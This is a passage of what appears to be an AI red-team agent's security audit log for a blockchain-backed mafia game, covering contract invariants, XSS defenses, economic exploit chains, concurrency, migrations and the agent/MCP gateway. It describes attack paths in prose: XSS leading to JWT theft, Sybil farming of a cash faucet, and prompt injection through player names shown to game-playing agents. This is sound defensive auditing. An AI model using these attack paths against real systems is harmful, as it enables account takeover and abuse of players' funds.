OmertaBond (`"OmertaBond"`) use DISTINCT domain names + verifyingContract + typehashes, so the two EIP-712
digest spaces are disjoint — a `Voucher` signature can never satisfy `recover(hashQuote)==signer` and
vice-versa, and per-contract nonce mappings keep nonce spaces independent regardless of backend key reuse.
OmertaBond's tranche cap (`committedOMR ≤ omr.balanceOf(this)`) holds under EVERY interleave (bond books
after the ≤ check + rolls back on a bad forward; claim drops committed and balance by the same amount; sweep
pulls only `balance − committed`) — no ordering strands a claim or mints; relies on OMR being inert
fixed-supply (confirmed). Linear vesting can't over/under/double-claim (truncates protocol-favorable,
`claimed` monotonic, `vestSeconds ≥ 1`); ETH splits (Bond POL+Vig, Fees→dev) sum to `msg.value` exactly
(counterpart = remainder), nonReentrant + CEI; all admin `onlyOwner`, no re-callable init, no unit confusion,
no `unchecked`. Accepted-as-designed (Safe = root of trust, not re-reported): VoucherClaim.sweep has no
committed-guard (no on-chain commitment notion — Safe-managed), recipient-revert DoS (Safe rotates). Residual
unchanged: **`forge test` still never executed here (Foundry egress-blocked)** — the pre-mainnet gate.

**Client XSS/DOM-injection — NO reachable XSS.** The safety is entirely SERVER-SIDE and holds: `cleanText`
(game.js:25) strips `<>"`+control chars from every free-text field (character/gang name, title, bounty/
contract reason, estate name, social proof), and strict allow-lists cover gang tag `[A-Z0-9]{2,4}`, plate
`[A-Z0-9 -]{2,8}`, crest `#rrggbb`, and dynasty/speakeasy/fighter/racer names (`[\w .,'&-]`) — so NO stored
string can carry `<`, `>`, or `"`. The client's 95 unescaped `${name}` innerHTML renders are all text-context
or double-quoted-attribute → neutralized by the server strip; the two single-quoted `data-body='...'` attrs
carry only a server enum id / numeric tier; the WS feed's raw `ev.type` is always a code-literal; admin.html
+ cards.js `esc()` (covers `<>&"'`) player names + telemetry props; wiki.html assembles only a static
in-file array. Verified sound across index.html / admin.html / wiki.html / cards.js.

**FLAGGED for the founder (defense-in-depth, NOT patched — ground rule #1):** the client's escaping is
ad-hoc and inconsistent — 95 unescaped name renders vs 3 `esc()`'d, plus a second incomplete `escapeHtml`
(missing `"'`) beside the complete `esc`. The client treats server-side `cleanText` as its SOLE XSS defense.
It's not currently reachable (the server strip blocks the break-out chars), but it's one regression away from
critical: any NEW free-text field that skips `cleanText`/an allow-list, or a `cleanText` regex regression,
becomes an instant stored XSS → localStorage JWT theft → account takeover (withdraw/wallet). The correct
hardening is to route ALL player-string renders through the single `esc()` helper — a 95-site client refactor
with zero CURRENT security benefit and real regression risk, so it's a founder-prioritizable hardening task,
not an autonomous-loop patch. The 95:3 escaping ratio is the fragility to raise.

**Round 27 verdict: both fresh high-value lenses (on-chain contracts + client XSS) returned NO reachable bug;
the contract signature/tranche/vesting invariants + the server-side XSS strip verified sound. 1 defense-in-
depth fragility flagged (client esc() consistency). No code change. Suite 33/33 + sim drift-0 (unchanged).**

---

## Round 28 — Cross-system economic exploit chains + referral/social Sybil anti-abuse

Two money-adjacent lenses single-system audits can't reach. **No CRITICAL/HIGH.** One MED anti-abuse fix
(that uncovered a real pg-mem-portability bug); one balance/design faucet flagged for founder sign-off.

**CONFIRMED + FIXED — the referral SPARK lacked the same-IP review flag the qualify path has (MED,
anti-abuse), AND both flags were silently untestable (pg-mem `ANY`-of-array bug).** `maybeSparkReferral`
(game.js) is the CHEAPEST referral cash faucet ($4k/alt, ~10 min, no check-in/net-worth floor) yet — unlike
`maybeQualifyReferral` (game.js:864) — emitted NO `referral_same_ip_flag` telemetry, so a same-machine ring
produced zero mod-review signal on the fastest faucet. Added the parity flag (telemetry-only, no payout/
mechanic change). **In fixing it I found a genuine portability bug:** both the existing qualify flag AND my
new spark flag used `SELECT … WHERE id = ANY($1)` with a JS-array param — which node-postgres serializes fine
in production, but **pg-mem returns ZERO rows for**, so the qualify same-IP flag has NEVER fired in any test
(unexercised since it was written) and my spark flag couldn't be regression-tested. Rewrote BOTH queries to
`IN ($1,$2)` — functionally identical in production, pg-mem-portable, and the self-referral guard above
guarantees the two ids differ. Regression: test/growth.js now asserts a same-IP spark pair emits
`referral_same_ip_flag {spark:true}` (both test accounts share 127.0.0.1) — which also finally exercises the
same-IP-flag mechanism for the first time. It's MED not HIGH because the spark is cash-only (laundering-cap +
0.01-ETH mint-fee gated, not directly extractable), agent-excluded, and per-IP auth-throttled.

**FLAGGED for founder sign-off (balance/design — NOT patched, ground rule #1): `bust:reward` is the one
house cash faucet with no anti-Sybil structure.** `social.js` `bust()` pays `500 + remaining_seconds×15` as
a `bust:reward` cash faucet (house-minted, NULL counterparty) with no family requirement, no per-buster/
per-target cooldown, and no daily cap — only the global 1/s bucket. A 2-alt ring could manufacture jailed
targets (fail-a-bust self-jails, or crime-fail jails) and bust them for ~$1,775–$3,200 each. **NOT currently
exploitable:** the chance formula subtracts `remaining/400`, so a long sentence (big reward) collapses to the
0.10 floor while short sentences cap the reward low — per-action yield is DOMINATED by direct crime income at
any comparable level (dominated, not additive), and the cash is non-extractable until laundered → the
reserve-bound. But it's the lone cash faucet whose safety rests entirely on crime yields staying above it +
jail durations staying short; a future "harsher sentences"/crime-nerf retune would silently make it the
cheapest farm. Recommended dial (founder call, changes §7.8 semantics + adds a cap): a family-member-only
gate (the intended "break out your own people") + a per-buster daily cap, to parity with npcHit's per-target
cooldown / the `WANTED_MIN_LVL` floor.

**Verified CLEAN — the composition layer is sound (the core confirmation):** the EXTRACTION BOUNDARY is
airtight — `requestWithdraw`/gear-withdraw are minted-gated AND bounded by `chain_reserve.funded_omr` (FIFO
full-reserve queue), and the reserve's ONLY funders are mod `fundReserve` + the backed `prize:omr` (vig/pass),
every one txHash-gated real-ETH revenue; NO player-callable path funds the reserve or mints $OMR beyond the
once-per-account latched `mission:%` + the backed `prize:omr`. So extraction ≤ real inflow holds BY
CONSTRUCTION — funnelling in-game $OMR to a minted alt (via `whack:loot`, the only account→account $OMR
transfer) only chooses WHO draws the same bounded reserve, never raises the total. All 8 chain classes traced
closed: taxed-PvP collusion (nets −rake burn), parimutuel farming (−5% rake, purse ⊆ rake), free-RWA→dividend
(dividend yields on invested `cost_omr` not book → free grants earn 0; reserve-neutral), gang-reserve-$OMR→
personal (no reserve→account path exists), port-piracy vs the supply cap (40% haircut > interdiction premium
→ emission only falls), kill faucet-stacking (transfers of the victim's own assets minus the death-burn →
net-negative for a ring), minted-gate confederate bypass (reserve-bounded regardless), growth faucets
(agent-excluded/once-per/verify-gated). Previously-flagged/accepted: family-contract cash cashout (§10.4-
clean, cash not $OMR, reserve-bounded), the untaxed `jump` cash-consolidation channel (consolidation ≠
extraction).

**Round 28 verdict: 1 MED anti-abuse fix (spark same-IP flag + the ANY→IN portability bug that unexercised
both flags) + regression; 1 balance faucet (`bust:reward`) flagged for founder sign-off; the cross-system
composition + extraction boundary verified sound. §10.4 untouched. Suite 33/33 + sim drift-0.**

---

## Round 29 — Error-handling / info-disclosure + Vig/Bond real-value concurrency (extraction ≤ backing)

Two lenses over the security perimeter + the money-backing layer under concurrency. **No CRITICAL/HIGH. No
reachable bug — no code change this round.** The extraction-backing layer verified sound under concurrency
(the strongest confirmation for the money layer).

**Error-handling / info-disclosure — VERIFIED SOUND.** The single Fastify error handler (server.js:196) maps
`GameError`→400 static-string codes / JWT→401 `{error:'auth'}` / everything else→server-side-log + generic
500 `{error:'internal'}` — no pg message, constraint/column name, SQL fragment, or stack EVER reaches a
client; non-retry pg codes (22P02/23503) fall through to the clean 500 (only 40P01/23505→contention,
23505-on-character→name_taken). Account UUIDs never reach clients (view/dossier/opportunities/leaderboards
all use character ids + names; the agent leaderboard strips `account_id` + bands wealth; the kick socket-close
resolves the account server-side). Auth is GameError-only (atomic invite consume, alg-pinned Privy, X probe
default-off, crypto wallet verify). No secrets in any `console.*` (500s log server-side only). Timing:
`timingSafeEqual` on MOD_KEY, no other secret compared with `===`. **Two LOW wealth-inference residuals, both
BY-DESIGN (flagged, NOT patched — ground rule #1):** `jump` returns the exact `stolen` amount (attacker-
knowable `stealPct` → inverts to the victim's exact POCKET cash ±$7) and `collectLoan` shortfall reveals the
borrower's pocket+in-transit — both bounded to the deliberately-exposed pocket store (bank + cleared-in-transit
+ staked $OMR unexposed), gated behind a committed PAID action (a robbery / an overdue collect), not a free
probe. The finder recommends accepting both as designed; the aggregate cheap-jump→exact-pocket→kill-EV effect
is a founder glance for the alpha, consistent with the documented "pocket is exposed, bank is the safe harbour."

**Vig/Bond real-value backing under concurrency — VERIFIED SOUND (extraction ≤ inflow holds BY CONSTRUCTION).**
Every read-then-write on the four backing singletons is serialized behind a `FOR UPDATE` lock acquired BEFORE
its spend-basis read: `vig_prize_pool` (runVigBuyback / payPrizes / settlePassStipend, pool→account order),
`chain_reserve` (requestWithdraw / gearWithdraw / drainQueue / cancelQueued, account→reserve order),
`bond_reserve` (recordBond). Traced every writer — no unlocked writer exists that an absolute `SET balance=$1`
could clobber. **(1)** buyback double-spend: two buybacks block on the pool lock before reading
`revenue−alreadySpent`; T2 re-reads T1's committed spend → correct (`vig_buyback` the sole recorder). **(2)**
reserve over-draw: `committedOutstanding` + nonce alloc + voucher insert all under the reserve lock;
`drainQueue` holds it across the whole FIFO sign loop; uses committed-EVER (a claim never re-opens signing
room) → `committed+amt ≤ funded` at every commit. **(3)** claim/reclaim double-free: `markClaimed` keeps the
voucher in `committedOutstanding` (frees NO room — the honest full-reserve model); `reclaimExpiredVouchers`
consults on-chain `usedNonce` fail-closed + re-checks `status='signed' FOR UPDATE`. **(4)** prize-vs-stipend:
both lock the pool first, check `pay ≤ balance` under it; the route-settle + worker-sweep re-read
`pass_owed FOR UPDATE`. **(5)** txHash/nonce idempotency: `fee_payments`/`store_payments`/`bonds.nonce` PKs +
`vig_revenue PRIMARY KEY(source,ref)` reject concurrent duplicates with 23505 (rolled back + rethrown so the
watcher cursor never advances past an unrecorded payment) — even the outer-guardless `recordTradeFee` path
can't double-count. **(6)** the invariant read-across-statements asymmetry can only produce a transient false
ALARM, never a false OK (live enforcement under the reserve lock guarantees no persistent over-draw to miss).
**Two LOW residuals, both fail-SAFE + not currently reachable (flagged, NOT patched):** a post-commit
`fundReserve`-then-throw + a MANUAL whole-call retry could double-fund (the dangerous direction) — but
`payPrizes` is mod-route-only (no auto-retry) + the buyback worker doesn't retry within a tick, and invariant
(3) flags it; a `fundReserve`-throws-after-commit under-funds the reserve (the SAFE direction — the credited
$OMR just queues, never over-extracts). Both would only warrant an idempotency guard IF prize distribution is
ever wired into automated season rollover (the CLAUDE.md-deferred item).

**Round 29 verdict: both lenses (error-disclosure + vig/bond concurrency) returned NO reachable bug; the
error perimeter + the extraction-backing layer under concurrency verified sound. 2 by-design wealth-inference
+ 2 fail-safe backing seams flagged. No code change. Suite 33/33 + sim drift-0 (unchanged).**

---

## Round 30 — Stateful state-machine correctness + Schema integrity

Two narrow pg-mem-invisible lenses (un-re-checked transitions + missing DB constraints — the surfaces
tests structurally can't reach). **No CRITICAL/HIGH. No reachable bug — no code change this round.** One
generalized operational MED flagged for the founder deploy process.

**Stateful state machines (all 6 families) — VERIFIED SOUND.** Every multi-step persisted machine advances
via `FOR UPDATE` + a status/owner re-check under the char/account/singleton lock, with state-singleton-
before-row ordering on the escrow resolvers — no interleaving double-advances, re-enters a terminal state,
mis-times the stake, or strands a live counterparty: **blackjack** (`blackjack_hands` PK → no two live hands;
bet debited at DEAL so abandon forfeits nothing + can't re-deal; double gated `length!==2`; house-book
atomic via the `den_volume` row lock); **poker/tournament** (one-shot under withTwoCharacters; enter/resolve
lock `poker_state` before the row, status re-checked, closed-window rejected); **boxing belt/callout/main-
event** (both fighter rows + the `boxing_title` singleton locked before the `booked` check → no double-book/
double-belt/double-pay; resolve-vs-cancel-at-death both `status='booked'`-gated); **pen shank/break/hole**
(`pen_break_members` UNIQUE + executeBreak re-verifies the crew + re-checks jailed/hole/hosp under lock; shiv
consumed absolutely); **convoy/port** (row `FOR UPDATE` + status/`atSea` re-check → no depart/collect/ambush
twice, window-disjoint); **loan/market/auction/GP/futurity/stakes** (row/state lock + status re-check → the
settled row can't re-resolve; market `buyListing` kind-guard + outbid-refund-under-lock intact). Two NON-
exploitable quirks (cosmetic, no value/state corruption): a boxing callout-block grief (a third manager
booking the #1 contender's LISTED fighter to time out the champ's accept — gated by the contender's own
consent-by-listing) and a belt-strip during a booked title window (practically unreachable: DEFENSE_MS 7d ≫
the ~30min bout; the fight still decides the belt).

**Schema integrity — no missing-UNIQUE, no active orphan.** Every money/identity "one X per Y" the code
assumes IS PK/UNIQUE-backed (bounties/bounty_contributors/businesses/territory_rackets/speakeasies/landmarks/
gang_members/searches/batches/blackjack_hands/idempotency/mission_omr/wiretaps/vouchers/nonce PKs/vig_revenue
PK(source,ref)/portfolios/referrals/social_claims/…), or correctly app-lock-serialized where a partial-unique
trips pg-mem (one-living-char-per-account via `account_persistent FOR UPDATE`; one-open-tournament via the
`*_state` singleton lock). The runEstate wipe list was cross-referenced against every `character_id` table +
gang dissolution + the account-level survivor set → **currently complete, no active orphan**. All currency
columns carry `NOT NULL DEFAULT 0`; per-instance money columns are `NOT NULL` + always inserted with a value
→ no NULL-into-arithmetic path.

**FLAGGED for the founder deploy process (operational, NOT patched — a founder/migration-strategy decision
with real test-breakage risk):** **MED-1 — no migration path.** schema.sql is 100% `CREATE TABLE IF NOT
EXISTS` with ZERO `ALTER TABLE`, applied via one `pool.query(SCHEMA)` on boot. On an ALREADY-created Postgres
DB, `CREATE TABLE IF NOT EXISTS` is a no-op, so every column added to a table's CREATE block AFTER that table
first existed is silently ABSENT on an in-place upgrade → an alpha→v2 in-place migration would 500 every path
touching a new column (track_bets.odds/bet_racer_id, commission_votes.standing, gang_members.joined_at,
characters.wire_tier/contraband/berths/pen_faction/heat_exposure, + ~40 more added across the game's life).
Fresh deploys + the pg-mem/CI path are UNAFFECTED (a fresh boot creates every column) — which is exactly why
no test catches it. CLAUDE.md flagged this for ONE column (the `joined_at` "L3 deploy note"); the fix was
never added and the problem generalized. NOT auto-patched because (a) `ALTER TABLE … ADD COLUMN IF NOT
EXISTS` risks breaking the pg-mem/CI schema-apply (pg-mem's limited ALTER support → could break all 33
suites), (b) the real-Postgres path is un-testable here (no Postgres), and (c) migration strategy is a
founder decision. **Recommendation:** generate the migration from a real diff (`pg_dump` of prod vs the
current schema.sql) into an idempotent `ADD COLUMN IF NOT EXISTS` block run ONLY against real Postgres
(guarded by `DATABASE_URL`, outside the pg-mem path), or adopt a proper migration tool — before ANY in-place
upgrade. **MED-2 (defense-in-depth):** zero FKs / zero `ON DELETE` — referential integrity is 100% the
runEstate wipe loop (complete today, but a future forgotten `character_id` table orphans silently, invisible
to Postgres AND pg-mem — the class that produced the historical port_intercepts/npc_hits/convoy_ambushes
orphans); an `ON DELETE`-less FK per character-owned table would make it fail-closed. **LOW:** zero CHECK
constraints (all bounds app-validated, consistent — informational).

**Round 30 verdict: both lenses (state machines + schema integrity) returned NO reachable bug; all 6 state
machines + every money "one per Y" constraint verified sound. 1 generalized operational MED (no migration
path) flagged as a high-priority founder deploy item + MED-2 (no FKs) defense-in-depth. No code change.
Suite 33/33 + sim drift-0 (unchanged).**

---

## Round 31 — MCP server + agent gateway (single-finder, saturation cadence)

The one significant agent-facing component not yet code-audited this loop. **No CRITICAL/HIGH/MED — CLEAN.**
No code change.

**omerta-mcp/ + src/agentgateway.js — VERIFIED SOUND.** The universal `omerta_request{method,path,body}`
escape hatch resolves `new URL(path, BASE+'/')` and HARD-ASSERTS `url.origin === BASE.origin` before any
fetch (SSRF/traversal/`@evil`/`//evil`/`\\evil` all rejected or kept on-origin), attaches the bearer only
after the check, uses `redirect:'manual'` (defense-in-depth vs on-origin→off-origin redirect), and sets no
user-controlled headers. Strictly the player's own bearer — no MOD_KEY path. Idempotency key = sha256(method
path body) sliced to 128 bits (distinct requests → distinct keys; an intentional repeat replays, the safe
direction). NO credential leak: the token is memory-only, never in a tool result (`omerta_start` returns no
token), never printed (stderr logs the literal `"(token preset)"`), never in an error body. OpenAPI: all 25
`/v1/mod/*` routes are `modAuth`-gated → `onRoute` flags `isMod` → `buildOpenApi` excludes them; only
`bearerAuth` in `securitySchemes` (the `x-mod-key` name never emitted); security derived from the REAL
preHandler name so no authed route is mislabeled keyless (100% `auth`/`modAuth` coverage, zero anonymous/
array preHandlers). `baseUrl` is boot-time operator config with zero request-time input → no reflection/open-
redirect. Package: single official dep, no postinstall/eval/hardcoded-secret/backdoor. `agentLeaderboard`
publishes wealth BANDS not exact liquid (kill-EV-scanner already mitigated).

**FLAGGED (NOT patched):** LOW/hygiene — omerta-mcp's `@modelcontextprotocol/sdk ^1.0.0` floats with no
committed lockfile (pin + commit a lockfile for a published package; standard hygiene, not an exploit).
DESIGN — the opportunity board (`opportunities.js`) interpolates RAW, un-delimited player names into a
free-text `note` delivered to agents that may act on it (a player naming themselves an instruction-like
string) — inherent to agent play, server-authoritative names ≤24 chars, but unlike the card routes it neither
escapes nor structurally delimits the untrusted name; defense-in-depth would wrap player strings in a marked
data field + document to agent authors that board strings are attacker-influenced.

**Round 31 verdict: the agent/MCP surface returned NO reachable bug (no credential leak, no SSRF, no
mod-route/x-mod-key disclosure, no idempotency replay, no supply-chain exploit); 1 LOW hygiene + 1
prompt-injection DESIGN flag. No code change. Suite 33/33 + sim drift-0 (unchanged).**

---

## Loop saturation summary (R21–R31)

The autonomous red-team loop has reached comprehensive saturation. **Fixed (9 real defects, R21–R28):** the
`deal` gang→singleton lock inversion, `refundPot` singleton-interleave, `runSeasonRollover` per-row isolation,
`jump` pot→gangs inversion, the `TRACK_RACES` prototype-key allow-list bypass, the `/v1/ws` keyless-DoS
throttle, the R26 **HIGH** killed-player gang-feed info-leak, and the referral spark same-IP flag + `ANY`→`IN`
pg-mem portability bug — plus two defense-in-depth self-guards; one over-eager fix correctly reverted against
a test. **Verified sound (no reachable bug), often across independent lenses:** §10.4 invariant math (airtight,
248/248 reason coverage), on-chain contract invariants (no cross-contract EIP-712 replay, tranche cap, vesting/
splits), vig/bond real-value backing under concurrency (extraction ≤ inflow by construction), cross-system
extraction chains (all 8 closed, boundary not in-game-fundable), accrual/timing token-buckets, stateful state
machines (6 families), auth/idempotency/rate-limit lifecycle, WS/bus channel authz, error/info-disclosure,
input validation, estate-completeness/object-claim, value-creation/rounding, schema integrity, and the MCP/
agent surface. The last four rounds (R27/R29/R30/R31 — 7 fresh lenses) returned ZERO reachable code bugs.
**Founder sign-off backlog (flagged, not patched per ground rule #1):** MED-1 no DB migration path (top deploy
item), MED-2 zero FKs, the `bust:reward` unguarded faucet, client `esc()` consistency, two by-design wealth-
inference channels, two fail-safe vig backing seams, the agent-board prompt-injection surface, and the
standing pre-mainnet gates (`forge test`, third-party contract+signer audit, legal counsel). §10.4 untouched
throughout; suite 33/33 + sim drift-0 every round.

---

## MED-1 RESOLVED — the in-place-upgrade column migration (founder-directed, post-R30)

The R30 schema lens flagged MED-1 (no migration path) as the top founder deploy item; the founder chose to
clear it. **BUILT + tested (the 34th suite).** `src/db.js` now derives an idempotent
`ALTER TABLE … ADD COLUMN IF NOT EXISTS` set directly FROM `schema.sql` (`columnMigrations(schemaText)` —
a paren-depth table scan + depth-0-comma column split, stripping comments + column-level PK/UNIQUE/REFERENCES
so every generated `ADD COLUMN` is safe) and runs it (`migrateColumns`, each statement isolated so one
failure logs + skips rather than bricking boot) **immediately after `pool.query(SCHEMA)` in the real-Postgres
branch only** — pg-mem/CI boots exactly as before (zero test-breakage risk), while a real in-place upgrade now
back-fills every column a pre-existing table is missing. Deriving from the schema text keeps it drift-proof
and auto-covers every FUTURE column addition with no extra work. `test/migrate.js` proves the derived set is
well-formed (787 statements, no constraint/multi-column leakage, column-level PK stripped), a clean no-op on a
fresh DB (0 failures), and — the actual fix — that dropping a later-added column (`track_bets.odds`,
`characters.wire_tier`) to simulate an "old" DB and re-running the migration RE-ADDS it (idempotently). Suite
34/34 + sim drift-0. **MED-2 (zero FKs) remains a flagged defense-in-depth item** (the wipe loop is still the
sole referential-integrity mechanism — complete today); a proper migration tool / FK-cascade pass is the
larger follow-up if desired, but the acute in-place-upgrade break is now closed.

## MED-2 GUARDED + go-live checklist (founder-directed follow-up)

**MED-2 (zero FKs → a forgotten wipe orphans silently) — closed with a completeness GUARD, not FKs.** An
FK `ON DELETE CASCADE` is the wrong tool: on death the character row is KEPT (`alive=false`), never
`DELETE`d, so a cascade never fires — and adding FKs to schema.sql risks breaking the pg-mem test path. The
actual risk is a FUTURE `character_id` table a dev forgets to wipe. `test/migrate.js` now also parses
schema.sql for every literal-`character_id` table (42) and asserts each has a documented death disposition
in a `DISPOSITION` map — **31 wiped** (runEstate loop) / **3 special** (fighters→boxing.js, gang_members→
removeMember, speakeasy_patrons→speakeasy.js) / **5 escrow** (futurity/gp/poker/stakes/track entries —
settled at the worker resolve with a `*:death` burn, deliberately not wiped) / **3 ledger** (`transactions`
the §10.4 record, `rng_audit`, `notifications` — immutable/historical, a dead id is a valid ref). A NEW
unclassified `character_id` table now **fails CI closed**, and every wiped/special table is asserted to have
a death-cleanup DELETE in src (classification ⇒ code). Scope note in-test: tables using a differently-named
character-ref column (npc_hits payer/target, searches hunter/target, wiretaps watcher/target, loans, …) are
outside the parser but were verified complete by the R30 audit + are cleaned by named `*AtDeath` handlers.

**`DEPLOY.md` — off-chain alpha go-live checklist.** Pre-flight (34/34 + sim), the 4 production boot-refusal
requireds (NODE_ENV/DATABASE_URL/JWT_SECRET/MARKET_SEED), recommended config (`SOCIAL_VERIFY_MODE=live`,
MOD_KEY, RATE_LIMIT, TRUST_PROXY-if-proxied, INVARIANT_WEBHOOK_URL), the chain-vars-stay-unset note, the
test-only knobs the boot guard already rejects, the two processes (API + worker), the automatic first-boot
schema+column-migration, a post-deploy smoke check, and the still-gated mainnet items. Suite 34/34 + sim
drift-0.

## Round 32 — three fresh dedicated lenses over the least-loop-audited newest surfaces

The loop had saturated the older systems (R27/R29/R30/R31 returned zero reachable bugs), so R32 pointed
three fresh-lens agents at the newest un-loop-audited code plus a manual lens on the keyless public surface:
(1) THE WIRE step five (`sweepStandingWatches` — a WORKER that autonomously BURNS a player's $OMR) +
enroll/cancel/subscribe/tiered ladder; (2) THE PORT steps four–five (warehouse/`fenceContraband`/`rentBerth`,
the Coast-Guard→`heat_exposure` RICO tie-in, and the contraband-loot-on-fire-kill); (3) THE GRAND PRIX
cash-parimutuel escrow (`enterGrandPrix`/`resolveGrandPrix` + the new `grand prix escrow` §10.4 check); and
manually the public keyless routes (cards/profile/openapi/agents/llms).

**One confirmed defect (LOW–MED) FIXED — a stale territory specialist survives leave/kick:**
The Territory step-five specialist bonus is a SNAPSHOT (`territory.js:23-26` `specFort`/`scrutinyNet` read the
frozen `spec_power` and only test `r.specialist` truthy — never re-validating living family membership). The
DEATH path already clears it (`social.js:1419` `UPDATE territory_rackets SET specialist=NULL, spec_power=0
WHERE specialist=$1`), but the DEPARTURE path did NOT: `removeMember` (leave via `leaveGang` / kick via
`kickMember`) deleted the `gang_members` row and never touched `territory_rackets`, and
`releaseTerritoryRackets` only fires on full dissolution. So a specialist who left/was kicked kept buffing the
racket's fortitude + scrutiny-resistance indefinitely — worse, after joining a RIVAL family his stats would
shield the very operation his new family raids. Impact is bounded + §10.4-clean (defensive/pacing only, no
cash/faucet, not stackable, capped by the rival-raid P clamp) → LOW–MED, and it self-heals on the man's
eventual death, but it contradicted the explicit death-path invariant. **Fix:** `removeMember` (`social.js:84`)
now mirrors the death-path clear right after deleting the membership row — `UPDATE territory_rackets SET
specialist=NULL, spec_power=0 WHERE specialist=$1` (on dissolution the rackets are released below anyway; in
the survive path this clears exactly the departing specialist). **Regression** (`test/social.js`): re-assign a
specialist, KICK them, assert the racket's `specialist` goes null.

**Verified CLEAN (no CRITICAL/HIGH/MED), each traced to source:**
- **THE WIRE step five** — `sweepStandingWatches` only decrements $OMR paired with a negative `intel:watch`
  row (in the omr `KNOWN_REASONS` + the `omrBurns` `intel:%` term), never mints; the load-bearing no-double-burn
  property holds — each renewal `BEGIN`s and locks `account_persistent … FOR UPDATE` BEFORE the affordability
  read+decrement, and every player omr-spend path takes the SAME account lock at load (withCharacter /
  withTwoCharacters / persistAccount absolute-write) → they serialize, the stale-read clobber is impossible;
  two worker ticks serialize and the in-txn tap re-read makes the loser `ROLLBACK`; watchSlots cap oldest-first
  (a tier downgrade renews fewer); `wire_tier` is a direct-SQL column outside the persist positional list; the
  once-per-12h renew guard holds; a bad tier falls back to tier-1 config and charges the resolved tier (no
  pay-low-get-high).
- **THE PORT steps four–five** — `port:fence`/`port:berth`/`port:buy` are ledgered cash reasons under the
  `port:` prefix; the fence faucet is bounded by legitimately-sourced (supply-capped) warehoused stock —
  `fenceMultOf` 0.85–1.25 is a market-timing lever on already-earned stock, not a mint; `contraband`/`berths`
  are direct-SQL NUMERIC/INT columns (absolute writes) outside the persist list (no clobber); warehouse collect
  + fence are both safehouse-blocked (D2); the Coast-Guard `heat_exposure` bump is in-memory persisted once
  (positional $47, no double-count) and moves no value; `harborToll` follows characters→accounts→gangs order.
- **contraband-loot-on-fire-kill** (`social.js:1033-1041`) — a conserving pure ownership move (victim −X /
  killer +X, no ledger row since contraband isn't a §10.4 currency), bounded by the victim's supply-capped
  stock, PLAYER-fire-kill-only (NPC/mod/huntWanted call runEstate directly and never reach the block), and the
  `contraband` column is outside the persist list so neither side is clobbered.
- **THE GRAND PRIX escrow** — a faithful port of the audited poker-tournament/stakes escrow: the `grand prix
  escrow` identity is provably 0 on every terminal state (settled / short-field refund / all-dead) with all
  rounding + tie-split drift absorbed into `totalTake` (no cent minted/leaked); lock order mirrors the tournament
  exactly (char → grand_prix_state → grand_prix on both enter and resolve, STATE-before-ROW → no AB-BA);
  enter-vs-settle is safe (the `closed` gate rejects any buy-in past `resolves_at`; settle idempotent via the
  `status='open'` re-check + `clearCurrent AND current=$1`; PK backstops duplicate entry); resolve uses the
  entry POWER snapshot (selling/melting/pledging the car after entry can't crash it); `grand_prix_entries` is
  deliberately estate-wipe-excluded so a dead entrant's stake burns `race:gp:death` at resolve; alt-stuffing is
  −EV; the rake is the audited casino:pvp NULL-take-row mechanism, not a mint-on-top.
- **the public keyless surface** (cards/profile/openapi/agents/llms) — `clip(48)` bounds render+rasterize cost,
  card types whitelisted, `checkPublicRateLimit` per-IP covers the heavy GETs (R19/R25), the PNG cache is
  content-hashed+capped, `publicDossier` returns bands only (no exact wealth — the anti-precise-kill-EV rule
  holds), every dynamic field `esc()`'d / `encodeURIComponent`'d, and the OpenAPI contract `continue`s on the
  real `r.isMod` flag so `/v1/mod/*` never enters `paths` and no `x-mod-key` scheme is advertised.

**Round 32 verdict:** one LOW–MED stale-specialist inconsistency on leave/kick FIXED (mirrors the death-path
clear) + regression; the three highest-value newest surfaces (autonomous $OMR-burning worker, the Port
warehouse/fence/loot faucets, the Grand Prix cash escrow) and the keyless public surface all confirmed CLEAN.
Suite 34/34 + sim drift-0.

## Round 33 — two dedicated two-party-PvP lenses + a systematic persist-clobber cross-check

The highest-risk class in the newest code is the two-party PvP path (lock order + persist-clobber + double-realize
under `withTwoCharacters`). R33 pointed two fresh lenses there — (1) THE PORT step-two PvP (`interceptRun` piracy +
`rendezvous` handoff + naval `hull`/`engine` upgrades); (2) THE SPEAKEASY two-party/PvP family (`standoverSpeakeasy`
forced sale, `buySpeakeasy`/`listSpeakeasy` buyout, `visitSpeakeasy` round, `playTable` back-room wheel, the
notoriety/`resolveRaid` prohibition raid, `resetClubToNewOwner`, the 20% `UPKEEP_BPS` drip) — plus a manual
systematic persist-clobber cross-check of every character-row column this session's newest modules write by direct
SQL against the `persistCharacter` positional list.

**No reachable bug — all three lenses CLEAN (no CRITICAL/HIGH/MED).** Verified at source:

- **THE PORT piracy/rendezvous** — `port:piracy` is exactly 60% of the owner's would-be `port:sale` and VOIDS the
  run (emission strictly falls; a ledgered cash faucet + ammo sink under the `port:` vocab); `interceptRun` locks the
  target BOAT `FOR UPDATE` before mutating and never locks the owner char (convoy-manifest discipline) so a concurrent
  owner `collectRun` serializes on the boat row (no double-realize; the second actor hits `landed`/`not_out`), and the
  `(boat_id,character_id)` PK blocks a same-pirate retry; two pirates can't both win (the first voids the run);
  `rendezvous` requires the partner's consent flag, rejects a busy/too-slow/self partner, locks both boats sorted, and
  moves the run atomically (no two-boat double-count); `contraband`/`berths`/`port_used`/`port_at` are direct-SQL,
  disjoint from the persist positional list; boat run/hull/engine live on the `boats` table (no persist path, absolute
  writes); a dead runner's `port_intercepts` are swept before the boats delete so a concurrent intercept reads
  `no_target`, no crash.
- **THE SPEAKEASY two-party/PvP** — every `speakeasy:*` cash reason is in the `speakeasy:` prefix vocab (bottle/naming
  ride `vanity:`); round/buyout/standover carve the 2% take FROM the price (payer −cost / receiver +net / street_tax
  +tax / 1% dev off-ledger — the audited `bodyguard:hire` mechanism, no mint-on-top), the table is the audited casino
  book (ledgered win faucet / bet sink, EV a small sink), upkeep + raid fine are clamped character_id'd sinks, seized
  pending is never ledgered; `withTwoCharacters` locks both chars sorted → both accounts → the club row → `street_tax`
  LAST on EVERY path (the v2 street_tax-before-X inversion stays fixed; no AB-BA vs a single-party collect/upgrade);
  `resetClubToNewOwner` banks the seller's pending (and resolves a WON standover's pending raid first so a friendly
  standover can't launder a fine) then transfers with the guest list reset + decor→stock + `income_at=shut_until` for a
  shut club, and the credited owner/seller is the re-locked, re-validated char (no stale-owner credit); the
  `chargeNotoriety` per-(patron,club) token bucket caps one account's heat below `RAID_THRESHOLD` (no single-account
  raid-forcing; only the accepted multi-alt residual), and `upgradeSpeakeasy` resolves a pending raid first + refuses
  while shut (the MED fix holds); all mutated columns are club-row (`FOR UPDATE`-locked), none character direct-SQL;
